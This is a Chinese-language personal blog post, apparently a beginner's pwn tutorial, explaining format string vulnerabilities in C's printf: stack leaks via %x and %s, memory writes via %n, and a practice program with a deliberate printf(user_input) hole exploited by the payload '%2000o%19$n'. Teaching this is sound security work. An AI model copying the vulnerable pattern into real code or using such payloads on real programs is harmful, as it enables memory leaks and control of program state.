---
layout: post
title:  "格式化字符串漏洞"
date:   2019-05-26
desc: "苟利国家生死以,岂因祸福避趋之"
keywords: none
categories: [Blue-whale]
tags: [pwn,二进制]
icon: icon-html
---

韩晓牛逼就完事了

# 函数声明

printf函数的函数声明

```c
int printf(const char* format,…)
```

format为字符串指针，后接可变参数

正常人的写法

```c
char str[100];
scanf("%s", str);
printf("%s", str);
```

比较牛掰的写法

```c
char str[100];
scanf("%s",str);
printf(str);
```

# 产生原理

~~wdnmd我网上抄的~~

```c
#include <stdio.h>
int main()
{
        printf("%d%d%d%d%s", 5, 6, 8, 0x21, "test");
        return 0;
}
```

对于这段代码，网上大佬写的汇编码如下

```assembly
.data
    str     db  "test",0
    format  db  "%d%d%d%d%s",0

.code
    push   str
    push   21h
    push   8
    push   6
    push   5
    push   format
    call   printf
```

函数会从最右边的参数开始逐个压栈，字符串则传入指针

然而问题是printf支持可变参数，这就导致*函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中*，然后~~wdnmd~~就可能导致白给

```c
#include <stdio.h>
int main()
{
    printf("%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x");
    return 0;
}
```

这段代码没有给出任何传入参数，但是确实是能够输出值的

这些数值不是我们输入的参数，而是保存在栈中的其他的数值

~~wdnmd真白给啊~~

# 漏洞利用

> 内存打印

在0day攻击当中，如何获得对方内存中的数据是非常重要的一个技巧，而格式化字符串漏洞的其中一个利用方法便是能够获得内存中那些本不应该被我们知道的数据。这个过程我们称之为leak内存。0day攻击中一种重要的方法ret to libc就是以leak基地址为前提的。

只要我们在format中填入足够的参数，那么`printf`就可以打出储存在栈中的，那些本不能被知道的信息。只要计算好format在栈中的地址与需要leak的信息地址之差。就可以得到想要的数据

如format在0x20处而dest数据在0x00处。他们一共相差32个字节，那么我们就可以构造"%f%f%f%d,%x"这样的字符串。逗号前面会的"%f%f%f%d"可以打印出比foramt更高位的28个字节的数据，当然这不是我们想要的。然后最后的一个%x便可以以16进制的形式打印出我们想要的数据了。

然后，更进一步，我们知道格式化字符串还有%s参数。那么，如果在栈中保存有指向我们感兴趣数据的指针，我们就可以在打印指针的时候使用一个%s来打印别的地方的内容。而且一般的程序都会将用户输入的数据储存在栈上。这就给了我们一个构造指针的机会，再结合格式化字符串漏洞，几乎可以得到所有内存数据。

（上面都是我抄来的orz）

> 修改内存

```c
#include <stdio.h>
int main()
{
    int a;
    printf("aaaaaaa%n\n", &a);
    printf("%d\n", a);
    return 0;
}
```

运行结果为

```C
aaaaaaa
7
```

说明a的值被修改为7

%n的功能是将已经打印的字符个数给传入的指针，然后a就被改了

韩晓牛逼！

# 实践

```c
#include <stdio.h>
int main() {
        int flag = 0;
        int *p = &flag;
        char a[100];
        scanf("%s", a);
        printf(a);
        if(flag == 2000) printf("good!!\n");
        return 0;
}
```

由于linux跑不起IDA Pro，然后直接用gdb跑算了

观察栈发现p在第19个

那么构造payload如下

```c
%2000o%19$n
```

输出2000位然后把已经打印的字符数2000传给栈第19位即p

成功输出good